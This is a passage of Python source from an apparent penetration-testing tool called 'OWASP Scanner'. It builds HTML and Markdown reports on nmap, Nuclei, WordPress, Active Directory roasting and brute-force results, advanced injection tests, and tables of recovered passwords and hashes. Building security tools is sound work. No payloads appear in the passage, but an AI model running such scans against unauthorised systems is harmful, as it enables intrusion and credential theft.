      <label class="search"><i class="ph ph-magnifying-glass muted"></i><input id="q" type="search" placeholder="Filter tables (host, port, CVE, hash...)"></label>
      <button class="btn" onclick="window.print()" type="button"><i class="ph ph-file-pdf"></i> <span>Export PDF</span></button>
      <button id="themeBtn" class="btn theme-btn" type="button" aria-label="Change theme"><i id="themeIcon" class="ph ph-moon"></i> <span id="themeLabel">Theme</span></button>
    </div>
    <section class="hero">
      <div>
        <div class="eyebrow">OWASP Methodology // Security Assessment</div>
        <h1>OWASP Scanner</h1>
        <p>__TARGET__</p>
        <div class="tags">
          <span class="badge badge-info">OWASP Scanner v__TOOL__</span>
          <span class="badge badge-__RISK_TONE__">Risk __RISK_LABEL__</span>
          <span class="badge">__DATE__</span>
        </div>
      </div>
      __RISK__
    </section>
    __FILTERS__
    __SECTIONS__
  </main>
</div>
<script>
(function(){
  var root=document.documentElement, key="owasp_scanner_dashboard_theme";
  var stored=localStorage.getItem(key);
  var initial=stored||((window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches)?"dark":"light");
  function paint(t){ root.setAttribute("data-theme",t);
    var i=document.getElementById("themeIcon"), l=document.getElementById("themeLabel");
    if(i) i.className="ph "+((t==="dark")?"ph-sun":"ph-moon"); if(l) l.textContent=(t==="dark")?"Light mode":"Dark mode"; }
  paint(initial);
  document.getElementById("themeBtn").addEventListener("click",function(){
    var next=root.getAttribute("data-theme")==="dark"?"light":"dark"; paint(next); localStorage.setItem(key,next); });
  var sb=document.getElementById("sidebar"), mb=document.getElementById("menuBtn");
  if(mb) mb.addEventListener("click",function(){ sb.classList.toggle("open"); });
  // Collapse sidebar (desktop) with persistence
  var layout=document.getElementById("layout"), ck="owasp_scanner_sidebar_collapsed";
  function setCollapse(c){ layout.classList.toggle("collapsed",c);
    var ic=document.getElementById("collapseIcon"); if(ic) ic.style.transform=c?"rotate(180deg)":"none"; }
  setCollapse(localStorage.getItem(ck)==="1");
  function toggleCollapse(){ var c=!layout.classList.contains("collapsed"); setCollapse(c); localStorage.setItem(ck,c?"1":"0"); }
  var cb=document.getElementById("collapseBtn");
  if(cb) cb.addEventListener("click",function(){ if(window.innerWidth<=980){ sb.classList.remove("open"); } else { toggleCollapse(); } });
  // Scrollspy
  var links=[].slice.call(document.querySelectorAll(".side-nav a"));
  var map={}; links.forEach(function(a){ map[a.getAttribute("data-target")]=a; });
  var obs=new IntersectionObserver(function(es){
    es.forEach(function(e){ if(e.isIntersecting){ links.forEach(function(a){a.classList.remove("active");});
      var a=map[e.target.id]; if(a) a.classList.add("active"); } });
  },{rootMargin:"-12% 0px -80% 0px"});
  document.querySelectorAll("section.section").forEach(function(s){ obs.observe(s); });
  links.forEach(function(a){ a.addEventListener("click",function(){ if(window.innerWidth<=980) sb.classList.remove("open"); }); });
  // Filtros: texto, severity, seccion
  var activeSev="all", activeSec="all";
  function applyRowFilters(){
    var qv=document.getElementById("q"); var v=qv?qv.value.trim().toLowerCase():"";
    document.querySelectorAll("tbody tr").forEach(function(tr){
      if(tr.querySelector("td.empty")){ tr.classList.remove("hidden-row","sev-hidden"); return; }
      var sev=tr.getAttribute("data-sev")||"";
      tr.classList.toggle("sev-hidden", activeSev!=="all" && sev && sev!==activeSev);
      tr.classList.toggle("hidden-row", !!(v && tr.textContent.toLowerCase().indexOf(v)===-1));
    });
  }
  function applySecFilter(){
    document.querySelectorAll("section.section").forEach(function(s){
      if(activeSec==="all"||s.id==="summary"){ s.style.display=""; return; }
      s.style.display=(s.id===activeSec)?"":"none";
    });
  }
  document.querySelectorAll("[data-filter-sev]").forEach(function(btn){
    btn.addEventListener("click",function(){
      document.querySelectorAll("[data-filter-sev]").forEach(function(b){b.classList.remove("active");});
      btn.classList.add("active"); activeSev=btn.getAttribute("data-filter-sev"); applyRowFilters();
    });
  });
  document.querySelectorAll("[data-filter-sec]").forEach(function(btn){
    btn.addEventListener("click",function(){
      document.querySelectorAll("[data-filter-sec]").forEach(function(b){b.classList.remove("active");});
      btn.classList.add("active"); activeSec=btn.getAttribute("data-filter-sec"); applySecFilter();
    });
  });
  var q=document.getElementById("q");
  if(q) q.addEventListener("input", applyRowFilters);
})();
</script>
</body>
</html>"""
    return (
        template
        .replace("__TITLE_TARGET__", esc(report_data.get("target", "")))
        .replace("__TARGET__", esc(report_data.get("target", "")))
        .replace("__DATE__", esc(report_data.get("date", "")))
        .replace("__TOOL__", esc(report_data.get("tool", "")))
        .replace("__RISK_TONE__", risk_tone)
        .replace("__RISK_LABEL__", esc(risk_label))
        .replace("__RISK__", risk_html)
        .replace("__NAV__", nav)
        .replace("__FILTERS__", filter_html)
        .replace("__SECTIONS__", section_html)
    )

def _md_escape_cell(value):
    """Escapes the content of a markdown table cell."""
    text = str(value) if value is not None else ""
    # No line breaks or literal pipes
    text = text.replace('\r', ' ').replace('\n', '<br>')
    text = text.replace('|', '\\|')
    return text or "-"

def _md_table(headers, rows):
    """Generate a standard Markdown table (escaping pipes and line breaks)."""
    if not headers:
        return ""
    header_line = "| " + " | ".join(_md_escape_cell(h) for h in headers) + " |"
    sep_line = "| " + " | ".join("---" for _ in headers) + " |"
    lines = [header_line, sep_line]
    for r in rows:
        cells = [_md_escape_cell(r[i] if i < len(r) else "") for i in range(len(headers))]
        lines.append("| " + " | ".join(cells) + " |")
    return "\n".join(lines)

def _build_markdown_report(report_data):
    """Build the complete pentest summary in Markdown (GitBook/GitHub compatible)."""
    scan_data = report_data.get("scan_data", {}) or {}
    findings = report_data.get("findings", []) or []
    target = report_data.get("target", "")
    date = report_data.get("date", "")

    general = scan_data.get("general", {}) or {}
    nuclei_summary = scan_data.get("nuclei_summary", {}) or {}
    nuclei_findings_list = scan_data.get("nuclei_findings", []) or []
    spider = scan_data.get("spider", {}) or {}
    injection = scan_data.get("injection", {}) or {}
    vhosts = scan_data.get("vhosts", []) or []
    dir_hits = scan_data.get("directory_hits", []) or []
    api_endpoints = scan_data.get("api_endpoints", []) or []
    users = scan_data.get("users", []) or []
    emails = scan_data.get("emails", []) or []
    creds = scan_data.get("bruteforce_credentials", []) or []
    wordpress = scan_data.get("wordpress", {}) or {}
    robots_paths = scan_data.get("robots_paths", []) or []
    http_methods = scan_data.get("http_methods", []) or []
    src_code = scan_data.get("source_code_analysis", {}) or {}
    src_findings = src_code.get("findings") or []
    nmap_data = scan_data.get("nmap", {}) or {}
    nmap_ports = nmap_data.get("ports", []) or []
    nmap_nse = nmap_data.get("nse_results", []) or []
    active_directory = scan_data.get("active_directory", {}) or {}
    ad_ldap = active_directory.get("ldap") or {}
    ad_imp = active_directory.get("impacket") or {}
    ad_nxc = active_directory.get("nxc") or {}
    asrep_hashes = (ad_imp.get("asrep_roast") or {}).get("hashes") or []
    kerberoast_hashes = (ad_imp.get("kerberoast") or {}).get("hashes") or []
    ad_creds = (ad_nxc.get("bruteforce") or {}).get("credentials") or []

    def _tech_str(item):
        if isinstance(item, dict):
            name = str(item.get("name", "")).strip()
            detail = str(item.get("detail", "")).strip()
            return f"{name} ({detail})" if name and detail else (name or detail or "")
        return str(item)

    def _count_label(total, limit):
        """'(N)' si total <= limit; '(top limit de total)' en caso contrario."""
        if total <= limit:
            return f"({total})"
        return f"(top {limit} de {total})"

    SEV_ORDER = {'critical': 0, 'high': 1, 'medium': 2, 'low': 3, 'info': 4, 'unknown': 5}

    parts = []
    parts.append(f"# OWASP Scanner - Pentest Report")
    parts.append("")
    parts.append(f"- **Target:** `{target}`")
    parts.append(f"- **Date:** {date}")
    parts.append(f"- **Tool:** OWASP Scanner v{report_data.get('tool', '')}")
    parts.append("")

    # 1. Executive summary
    parts.append("## Executive Summary")
    parts.append("")
    techs = general.get("technologies", []) or []
    tech_str = ", ".join(_tech_str(t) for t in techs) or "-"
    overview_rows = [
        ["Status HTTP", str(general.get("status_code", "-"))],
        ["Server", str(general.get("server", "-"))],
        ["Technologies", tech_str],
        ["Findings (FINDINGS)", str(len(findings))],
        ["Open ports (nmap)", str(len(nmap_ports))],
        ["Targeted NSE Results", str(len(nmap_nse))],
        ["Vulnerabilities Nuclei", str(len(nuclei_findings_list))],
        ["URLs spider", str(spider.get("total_urls", 0))],
        ["Subdominios (vhosts)", str(len(vhosts))],
        ["Directories found", str(len(dir_hits))],
        ["Endpoints API", str(len(api_endpoints))],
        ["Users", str(len(users))],
        ["Emails", str(len(emails))],
        ["Valid credentials", str(len(creds))],
        ["WordPress vulnerabilities", str(len(wordpress.get("vulnerabilities") or []))],
        ["Users AD (LDAP)", str(len(ad_ldap.get("users") or []))],
        ["AS-REP roastable", str(len(asrep_hashes))],
        ["Kerberoastable SPNs", str(len(kerberoast_hashes))],
        ["Credentials AD (NXC)", str(len(ad_creds))],
        ["Source-code findings", str(len(src_findings))],
    ]
    parts.append(_md_table(["Field", "Value"], overview_rows))
    parts.append("")

    # 2. Headers de seguridad
    sec_header_names = [
        "Strict-Transport-Security", "Content-Security-Policy",
        "X-Frame-Options", "X-Content-Type-Options",
        "Referrer-Policy", "Permissions-Policy",
    ]
    headers = (general.get("headers") or {})
    sec_rows = []
    for h in sec_header_names:
        v = headers.get(h) or headers.get(h.lower()) or "-"
        present = v != "-"
        sec_rows.append([h, "OK" if present else "AUSENTE", v])
    parts.append("## Headers de seguridad")
    parts.append("")
    parts.append(_md_table(["Header", "Status", "Value"], sec_rows))
    parts.append("")

    # 3. Cookies
    cookies = general.get("cookies") or []
    if cookies:
        parts.append("## Cookies detected")
        parts.append("")
        parts.append(_md_table(["Cookie"], [[c] for c in cookies]))
        parts.append("")

    # 4. HTTP methods + robots
    misc_rows = []
    if http_methods:
        misc_rows.append(["HTTP Methods allowed", ", ".join(http_methods)])
    if robots_paths:
        misc_rows.append([f"Paths robots/sitemap ({len(robots_paths)})", ", ".join(robots_paths[:15])])
    if misc_rows:
        parts.append("## Information HTTP adicional")
        parts.append("")
        parts.append(_md_table(["Category", "Value"], misc_rows))
        parts.append("")

    # 4b. Nmap (puertos abiertos)
    if nmap_ports:
        parts.append(f"## Port Scan (Nmap) ({len(nmap_ports)})")
        parts.append("")
        if nmap_data.get("command"):
            parts.append(f"- **Comando:** `{nmap_data['command']}`")
        if nmap_data.get("host"):
            parts.append(f"- **Host:** `{nmap_data['host']}`")
        if nmap_data.get("hostnames"):
            parts.append(f"- **Hostnames:** {', '.join(nmap_data['hostnames'])}")
        parts.append("")
        nm_rows = []
        for p in nmap_ports:
            vparts = [p.get("product", ""), p.get("version", ""), p.get("extrainfo", "")]
            version_str = " ".join(v for v in vparts if v).strip() or "-"
            nm_rows.append([
                f"{p.get('port', '-')}/{p.get('protocol', '')}",
                str(p.get("state", "-")),
                str(p.get("service", "") or "-"),
                version_str,
            ])
        parts.append(_md_table(["Port", "Status", "Service", "Version"], nm_rows))
        parts.append("")

    if nmap_nse:
        parts.append(f"## Nmap Targeted NSE ({len(nmap_nse)})")
        parts.append("")
        if (nmap_data.get("nse") or {}).get("command"):
            parts.append(f"- **Comando:** `{(nmap_data.get('nse') or {}).get('command')}`")
            parts.append("")
        rows = [[
            f"{item.get('port', '-')}/{item.get('protocol', '')}",
            str(item.get("service") or "-"),
            str(item.get("script_id") or "-"),
            str(item.get("output") or "-"),
        ] for item in nmap_nse]
        parts.append(_md_table(["Port", "Service", "Script", "Output"], rows))
        parts.append("")

    # 5. Spider
    if spider:
        parts.append("## Spidering")
        parts.append("")
        spider_rows = [
            ["Total URLs", str(spider.get("total_urls", 0))],
            ["Unique parameters", str(spider.get("total_params", 0))],
            ["Forms", str(spider.get("total_forms", 0))],
        ]
        parts.append(_md_table(["Metric", "Value"], spider_rows))
        parts.append("")
        sample_urls = spider.get("sample_urls") or []
        if sample_urls:
            parts.append(f"### URLs discovered ({len(sample_urls)})")
            parts.append("")
            parts.append(_md_table(["URL"], [[u] for u in sample_urls]))
            parts.append("")

    # 5b. Source-code analysis
    if src_code:
        sev_stats = src_code.get("summary") or {}
        parts.append("## Source-code analysis")
        parts.append("")
        code_overview = [
            ["Pages analyzed", str(src_code.get("pages_analyzed", 0))],
            ["Assets JS/JSON analizados", str(src_code.get("assets_analyzed", 0))],
            ["Total findings", str(len(src_findings))],
            ["Critical", str(sev_stats.get("critical", 0))],
            ["High", str(sev_stats.get("high", 0))],
            ["Medium", str(sev_stats.get("medium", 0))],
            ["Low", str(sev_stats.get("low", 0))],
        ]
        parts.append(_md_table(["Metric", "Value"], code_overview))
        parts.append("")
        if src_findings:
            sorted_src = sorted(
                src_findings,
                key=lambda x: SEV_ORDER.get(x.get("severity", "low"), 9),
            )
            parts.append(f"### Source-code finding details ({len(sorted_src)})")
            parts.append("")
            rows = [[
                (f.get("severity") or "").upper(),
                str(f.get("type", "-")),
                str(f.get("value", "-")),
                str(f.get("url", "-")),
            ] for f in sorted_src]
            parts.append(_md_table(["Severity", "Type", "Detected value", "URL"], rows))
            parts.append("")

    # 6a. Subdominios (vhosts)
    if vhosts:
        parts.append(f"## Subdomains (vhosts) found ({len(vhosts)})")
        parts.append("")
        rows = [[str(v.get("status", "-")),
                 str(v.get("fqdn") or v.get("subdomain", "-")),
                 str(v.get("size", "-"))]
                for v in vhosts]
        parts.append(_md_table(["Status", "VHost", "Size"], rows))
        parts.append("")

    # 6b. Directories
    if dir_hits:
        parts.append(f"## Directories found ({len(dir_hits)})")
        parts.append("")
        rows = [[str(h.get("status", "-")), str(h.get("url", "-")), str(h.get("size", "-"))]
                for h in dir_hits]
        parts.append(_md_table(["Status", "URL", "Size"], rows))
        parts.append("")

    # 6c. WordPress / WPScan
    if wordpress:
        wp_version = wordpress.get("version") or {}
        wp_theme = wordpress.get("main_theme") or {}
        wp_users = wordpress.get("users") or []
        wp_plugins = wordpress.get("plugins") or []
        wp_vulns = wordpress.get("vulnerabilities") or []
        wp_creds = wordpress.get("credentials") or []
        parts.append("## WordPress / WPScan")
        parts.append("")
        wp_rows = [
            ["Detected", "Yes" if wordpress.get("detected") else "Not confirmed"],
            ["Version", str(wp_version.get("number") or "-")],
            ["Version status", str(wp_version.get("status") or "-")],
            ["Main theme", str(wp_theme.get("name") or "-")],
            ["Plugins detected", str(len(wp_plugins))],
            ["Users WPScan", str(len(wp_users))],
            ["Vulnerabilities", str(len(wp_vulns))],
            ["Credentials WP", str(len(wp_creds))],
        ]
        parts.append(_md_table(["Field", "Value"], wp_rows))
        parts.append("")
        if wp_users:
            parts.append("### Users WordPress")
            parts.append("")
            parts.append(_md_table(["User", "Name"], [[u.get("username", "-"), u.get("name", "-")] for u in wp_users]))
            parts.append("")
        if wp_vulns:
            parts.append("### Vulnerabilities WordPress")
            parts.append("")
            rows = [[
                v.get("component_type", "-"),
                v.get("component", "-"),
                v.get("title", "-"),
                v.get("fixed_in", "-"),
            ] for v in wp_vulns]
            parts.append(_md_table(["Type", "Component", "Title", "Fixed in"], rows))
            parts.append("")

    if active_directory:
        ad_ldap = active_directory.get("ldap") or {}
        ad_nxc = active_directory.get("nxc") or {}
        ad_kb = active_directory.get("kerbrute") or {}
        ad_imp = active_directory.get("impacket") or {}
        ad_creds = (ad_nxc.get("bruteforce") or {}).get("credentials", []) or []
        asrep_hashes = (ad_imp.get("asrep_roast") or {}).get("hashes", []) or []
        kerberoast_hashes = (ad_imp.get("kerberoast") or {}).get("hashes", []) or []
        parts.append("## Active Directory")
        parts.append("")
        ad_rows = [
            ["Domain Controller", str(active_directory.get("target") or "-")],
            ["Domain", str(active_directory.get("domain") or "-")],
            ["Base DN", str(active_directory.get("base_dn") or "-")],
            ["Mode", str(active_directory.get("auth_mode") or "-")],
            ["Kerbrute users validos", str(len(ad_kb.get("valid_users") or []))],
            ["AS-REP roastable", str(len(asrep_hashes))],
            ["Kerberoastable SPNs", str(len(kerberoast_hashes))],
            ["LDAP users", str(len(ad_ldap.get("users") or []))],
            ["LDAP groups", str(len(ad_ldap.get("groups") or []))],
            ["LDAP computers", str(len(ad_ldap.get("computers") or []))],
            ["NXC credentials", str(len(ad_creds))],
        ]
        parts.append(_md_table(["Field", "Value"], ad_rows))
        parts.append("")
        if ad_kb.get("valid_users"):
            parts.append("### Kerbrute users validos")
            parts.append("")
            parts.append(_md_table(["User"], [[u] for u in ad_kb.get("valid_users", [])]))
            parts.append("")
        if ad_ldap.get("users"):
            parts.append("### LDAP users")
            parts.append("")
            rows = [[u.get("username", "-"), u.get("upn", "-"), u.get("cn", "-"), ", ".join(u.get("memberOf") or [])]
                    for u in ad_ldap.get("users", [])]
            parts.append(_md_table(["User", "UPN", "CN", "Groups"], rows))
            parts.append("")
        if ad_ldap.get("groups"):
            parts.append("### LDAP groups")
            parts.append("")
            rows = [[g.get("name", "-"), g.get("description", "-"), str(len(g.get("members") or []))]
                    for g in ad_ldap.get("groups", [])]
            parts.append(_md_table(["Group", "Description", "Members"], rows))
            parts.append("")
        if ad_ldap.get("computers"):
            parts.append("### LDAP computers")
            parts.append("")
            rows = [[c.get("name", "-"), c.get("os", "-"), c.get("os_version", "-")]
                    for c in ad_ldap.get("computers", [])]
            parts.append(_md_table(["Computer", "OS", "Version"], rows))
            parts.append("")
        if ad_creds:
            parts.append("### Valid AD credentials (NXC)")
            parts.append("")
            parts.append(_md_table(["User", "Password"], [[c.get("username", "-"), c.get("password", "-")] for c in ad_creds]))
            parts.append("")
        if asrep_hashes:
            parts.append("### AS-REP Roasting (impacket-GetNPUsers)")
            parts.append("")
            parts.append(_md_table(["User", "Hash"], [[h.get("username", "-"), h.get("hash", "-")] for h in asrep_hashes]))
            parts.append("")
        if kerberoast_hashes:
            parts.append("### Kerberoasting (impacket-GetUserSPNs)")
            parts.append("")
            parts.append(_md_table(["User/SPN", "Hash"], [[h.get("username", "-"), h.get("hash", "-")] for h in kerberoast_hashes]))
            parts.append("")
        raw_commands = active_directory.get("raw_commands") or []
        if raw_commands:
            parts.append("### Output bruta de herramientas AD")
            parts.append("")
            for cmd in raw_commands:
                parts.append(f"#### {cmd.get('label', 'command')}")
                parts.append("")
                parts.append(f"- **Comando:** `{cmd.get('command', '-')}`")
                parts.append(f"- **Return code:** `{cmd.get('returncode', '-')}`")
                parts.append("")
                parts.append("```text")
                parts.append(str(cmd.get("output", "") or "").strip() or "-")
                parts.append("```")
                parts.append("")

    # 7. API endpoints
    if api_endpoints:
        parts.append(f"## Discovered API Endpoints ({len(api_endpoints)})")
        parts.append("")
        rows = [[str(ep.get("status", "-")),
                 str(ep.get("endpoint") or ep.get("url", "-")),
                 str(ep.get("content_type", "-"))]
                for ep in api_endpoints]
        parts.append(_md_table(["Status", "Endpoint", "Content-Type"], rows))
        parts.append("")

    # 8. Users and emails
    if users or emails:
        parts.append("## Discovered users and emails")
        parts.append("")
        ue_rows = []
        if users:
            ue_rows.append(["Users", ", ".join(users)])
        if emails:
            ue_rows.append(["Emails", ", ".join(emails)])
        parts.append(_md_table(["Category", "Values"], ue_rows))
        parts.append("")

    # 9b. Advanced tests (SSRF/SSTI/XXE/CRLF/Smuggling/Cache)
    adv_sec_md = scan_data.get("advanced_security") or {}
    if adv_sec_md:
        adv_md_ssrf = adv_sec_md.get("ssrf") or []
        adv_md_ssti = adv_sec_md.get("ssti") or []
        adv_md_xxe = adv_sec_md.get("xxe") or []
        adv_md_crlf = adv_sec_md.get("crlf") or []
        adv_md_smuggling = adv_sec_md.get("smuggling") or []
        adv_md_cache = adv_sec_md.get("cache_poisoning") or []
        parts.append("## Advanced Tests de Seguridad")
        parts.append("")
        parts.append(_md_table(["Module", "Findings"], [
            ["SSRF", str(len(adv_md_ssrf))],
            ["SSTI", str(len(adv_md_ssti))],
            ["XXE", str(len(adv_md_xxe))],
            ["CRLF", str(len(adv_md_crlf))],
            ["HTTP Request Smuggling", str(len(adv_md_smuggling))],
            ["Cache Poisoning", str(len(adv_md_cache))],
        ]))
        parts.append("")
        if adv_md_ssrf:
            parts.append(f"### SSRF ({len(adv_md_ssrf)})")
            parts.append("")
            parts.append(_md_table(["Type", "Vector", "Payload/Value", "HTTP"],
                [[r.get("type","ssrf"), r.get("param") or r.get("header") or "-",
                  (r.get("payload") or r.get("value") or "")[:80], str(r.get("status","-"))]
                 for r in adv_md_ssrf]))
            parts.append("")
        if adv_md_ssti:
            parts.append(f"### SSTI ({len(adv_md_ssti)})")
            parts.append("")
            parts.append(_md_table(["URL", "Parameter", "Engine"],
                [[r.get("url","-")[:80], r.get("param","-"), r.get("engine","-")] for r in adv_md_ssti]))
            parts.append("")
        if adv_md_xxe:
            parts.append(f"### XXE ({len(adv_md_xxe)})")
            parts.append("")
            parts.append(_md_table(["URL", "Content-Type", "Status"],
                [[r.get("url","-")[:80], r.get("content_type","-"), r.get("note","confirmado")] for r in adv_md_xxe]))
            parts.append("")
        if adv_md_crlf:
            parts.append(f"### CRLF Injection ({len(adv_md_crlf)})")
            parts.append("")
            parts.append(_md_table(["Vector", "URL/Param", "Payload"],
                [[r.get("vector","-"), (r.get("param") or r.get("url") or "-")[:60], r.get("payload","-")[:50]]
                 for r in adv_md_crlf]))
            parts.append("")
        if adv_md_smuggling:
            parts.append(f"### HTTP Request Smuggling ({len(adv_md_smuggling)})")
            parts.append("")
            parts.append(_md_table(["Tool/Type", "Detail"],
                [[(r.get("tool") or r.get("type") or "-"), (r.get("note") or r.get("output_snippet") or "-")[:100]]
                 for r in adv_md_smuggling]))
            parts.append("")
        if adv_md_cache:
            parts.append(f"### Cache Poisoning ({len(adv_md_cache)})")
            parts.append("")
            parts.append(_md_table(["Header", "Injected value", "Status"],
                [[r.get("header","-"), r.get("value","-")[:50], "Confirmed" if r.get("confirmed") else "Reflected"]
                 for r in adv_md_cache]))
            parts.append("")

    # 9. Injection
    if injection.get("executed"):
        parts.append("## Injection tests")
        parts.append("")
        inj_rows = [
            ["Forms detected", str(injection.get("forms_found", 0))],
            ["Detected GET parameters", str(injection.get("url_params_found", 0))],
            ["Tested GET parameters", str(len(injection.get("tested_get_params", [])))],
            ["Tested form inputs", str(len(injection.get("tested_form_inputs", [])))],
        ]
        parts.append(_md_table(["Metric", "Value"], inj_rows))
        parts.append("")

    # 10. Valid credentials
    if creds:
        parts.append("## Valid credentials found")
        parts.append("")
        rows = []
        for c in creds:
            user = c.get("username") if isinstance(c, dict) else str(c)
            pwd = c.get("password") if isinstance(c, dict) else "-"
            rows.append([str(user), str(pwd)])
        parts.append(_md_table(["User", "Password"], rows))
        parts.append("")

    # 11. Nuclei
    if nuclei_summary:
        parts.append("## Vulnerabilities by severity (Nuclei)")
        parts.append("")
        rows = []
        for sev in sorted(nuclei_summary.keys(), key=lambda s: SEV_ORDER.get(s, 99)):
            tids = nuclei_summary[sev]
            rows.append([sev.upper(), str(len(tids)), ", ".join(sorted(set(map(str, tids))))])
        parts.append(_md_table(["Severity", "Count", "Unique templates"], rows))
        parts.append("")

    relevant_nuclei = [n for n in nuclei_findings_list
                       if (n.get('severity') or '').lower() in ('critical', 'high', 'medium', 'low')]
    if relevant_nuclei:
        sorted_rel = sorted(relevant_nuclei,
                            key=lambda x: (SEV_ORDER.get((x.get('severity') or 'unknown').lower(), 99),
                                           str(x.get('template_id', ''))))
        parts.append(f"## Findings Nuclei relevantes ({len(sorted_rel)})")
        parts.append("")
        rows = [[(n.get('severity') or '').upper(),
                 str(n.get('template_id', '-')),
                 str(n.get('name', '-')),
                 str(n.get('url', '-'))]
                for n in sorted_rel]
        parts.append(_md_table(["Severity", "Template", "Name", "URL"], rows))
        parts.append("")

    # 12. Findings clasificados (FINDINGS)
    if findings:
        cats = {}
        for f in findings:
            text = _finding_text(f)
            m = re.match(r'^\[([^\]]+)\]', text)
            cat = m.group(1) if m else "OTHER"
            cats.setdefault(cat, []).append(text)
        parts.append(f"## Findings clasificados (total: {len(findings)})")
        parts.append("")
        cat_rows = [[cat, str(len(cats[cat]))] for cat in sorted(cats.keys())]
        parts.append(_md_table(["Category", "Count"], cat_rows))
        parts.append("")
        parts.append(f"### Finding details ({len(findings)})")
        parts.append("")
        rows = []
        for f in findings:
            text = _finding_text(f)
            m = re.match(r'^\[([^\]]+)\]\s*(.*)', text)
            if m:
                rows.append([m.group(1), m.group(2)])
            else:
                rows.append(["OTHER", text])
        parts.append(_md_table(["Category", "Detail"], rows))
        parts.append("")

    parts.append("---")
    parts.append("")
    parts.append("_Generated automatically by OWASP Scanner._")
    return "\n".join(parts)


def save_report(output_file=None):
    """Save findings and relevant data in TXT, JSON, HTML, and MD."""
    txt_file, json_file, html_file, md_file = _normalize_output_paths(output_file, TARGET_URL)
    scan_stats = {
        "authenticated": AUTHENTICATED,
        "threads": THREADS,
        "timeout": DEFAULT_TIMEOUT,
        "delay": REQUEST_DELAY,
        "total_findings": len(FINDINGS),
        "total_api_endpoints": len(SCAN_DATA.get("api_endpoints", [])),
        "total_vhosts": len(SCAN_DATA.get("vhosts", [])),
        "total_open_ports": len((SCAN_DATA.get("nmap") or {}).get("ports", [])),
        "total_nmap_nse_results": len((SCAN_DATA.get("nmap") or {}).get("nse_results", [])),
        "total_dir_hits": len(SCAN_DATA.get("directory_hits", [])),
        "injection_forms_found": SCAN_DATA.get("injection", {}).get("forms_found", 0),
        "injection_get_params_found": SCAN_DATA.get("injection", {}).get("url_params_found", 0),
        "injection_get_params_tested": len(SCAN_DATA.get("injection", {}).get("tested_get_params", [])),
        "injection_form_inputs_tested": len(SCAN_DATA.get("injection", {}).get("tested_form_inputs", [])),
        "total_users": len(SCAN_DATA.get("users", [])),
        "total_emails": len(SCAN_DATA.get("emails", [])),
        "total_bruteforce_credentials": len(SCAN_DATA.get("bruteforce_credentials", [])),
        "wordpress_detected": bool((SCAN_DATA.get("wordpress") or {}).get("detected")),
        "wordpress_users": len((SCAN_DATA.get("wordpress") or {}).get("users", [])),
        "wordpress_vulnerabilities": len((SCAN_DATA.get("wordpress") or {}).get("vulnerabilities", [])),
        "wordpress_credentials": len((SCAN_DATA.get("wordpress") or {}).get("credentials", [])),
        "total_spider_urls": SCAN_DATA.get("spider", {}).get("total_urls", 0),
        "total_source_code_findings": len((SCAN_DATA.get("source_code_analysis") or {}).get("findings", [])),
        "source_code_pages_analyzed": (SCAN_DATA.get("source_code_analysis") or {}).get("pages_analyzed", 0),
        "source_code_assets_analyzed": (SCAN_DATA.get("source_code_analysis") or {}).get("assets_analyzed", 0),
        "active_directory_users": len(((SCAN_DATA.get("active_directory") or {}).get("ldap") or {}).get("users", [])),
        "active_directory_kerbrute_users": len(((SCAN_DATA.get("active_directory") or {}).get("kerbrute") or {}).get("valid_users", [])),
        "active_directory_groups": len(((SCAN_DATA.get("active_directory") or {}).get("ldap") or {}).get("groups", [])),
        "active_directory_computers": len(((SCAN_DATA.get("active_directory") or {}).get("ldap") or {}).get("computers", [])),
        "active_directory_credentials": len((((SCAN_DATA.get("active_directory") or {}).get("nxc") or {}).get("bruteforce") or {}).get("credentials", [])),
        "active_directory_asrep_hashes": len((((SCAN_DATA.get("active_directory") or {}).get("impacket") or {}).get("asrep_roast") or {}).get("hashes", [])),
        "active_directory_kerberoast_hashes": len((((SCAN_DATA.get("active_directory") or {}).get("impacket") or {}).get("kerberoast") or {}).get("hashes", [])),
        "adv_ssrf_hits": len((SCAN_DATA.get("advanced_security") or {}).get("ssrf") or []),
        "adv_ssti_hits": len((SCAN_DATA.get("advanced_security") or {}).get("ssti") or []),
        "adv_xxe_hits": len((SCAN_DATA.get("advanced_security") or {}).get("xxe") or []),
        "adv_crlf_hits": len((SCAN_DATA.get("advanced_security") or {}).get("crlf") or []),
        "adv_smuggling_hits": len((SCAN_DATA.get("advanced_security") or {}).get("smuggling") or []),
        "adv_cache_hits": len((SCAN_DATA.get("advanced_security") or {}).get("cache_poisoning") or []),
    }
    SCAN_DATA["stats"] = scan_stats

    report_data = {
        "tool": VERSION,
        "target": TARGET_URL,
        "date": time.strftime('%Y-%m-%d %H:%M:%S'),
        "findings": list(FINDINGS),
        "scan_data": _to_serializable(SCAN_DATA),
    }

    saved = []
    errors = []
    try:
        with open(txt_file, 'w', encoding='utf-8') as f:
            f.write(f"OWASP Scanner v{VERSION} - Scan Report\n")
            f.write(f"Target : {TARGET_URL}\n")
            f.write(f"Date    : {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Mode auth: {'Yes' if AUTHENTICATED else 'No'}\n")
            f.write("=" * 60 + "\n\n")

            f.write("[SUMMARY]\n")
            for k, v in scan_stats.items():
                f.write(f"- {k}: {v}\n")
            f.write("\n")

            general = report_data["scan_data"].get("general", {})
            f.write("[GENERAL INFORMATION]\n")
            f.write(f"- Status: {general.get('status_code', 'N/A')}\n")
            f.write(f"- Server: {general.get('server', 'N/A')}\n")
            techs = general.get('technologies', [])
            if techs:
                if isinstance(techs[0], dict):
                    tech_str = ', '.join(f"{t.get('name','')}{'['+t.get('detail','')+']' if t.get('detail') else ''}" for t in techs)
                else:
                    tech_str = ', '.join(str(t) for t in techs)
            else:
                tech_str = 'N/A'
            f.write(f"- Technologies: {tech_str}\n")
            f.write(f"- Methods HTTP: {', '.join(report_data['scan_data'].get('http_methods', [])) or 'N/A'}\n")
            f.write(f"- robots/sitemap: {', '.join(report_data['scan_data'].get('robots_paths', [])) or 'N/A'}\n\n")

            nmap_data = report_data['scan_data'].get('nmap') or {}
            nmap_ports = nmap_data.get('ports') or []
            f.write("[PORT SCAN (NMAP)]\n")
            if nmap_data.get('command'):
                f.write(f"- Comando: {nmap_data['command']}\n")
            if nmap_data.get('host'):
                f.write(f"- Host: {nmap_data['host']}\n")
            if nmap_ports:
                for p in nmap_ports:
                    parts = [p.get('product', ''), p.get('version', ''), p.get('extrainfo', '')]
                    version_str = ' '.join(v for v in parts if v).strip()
                    f.write(
                        f"- {p.get('port')}/{p.get('protocol')} [{p.get('state', '')}] "
                        f"{p.get('service', '') or '?'}"
                        + (f" — {version_str}" if version_str else "")
                        + "\n"
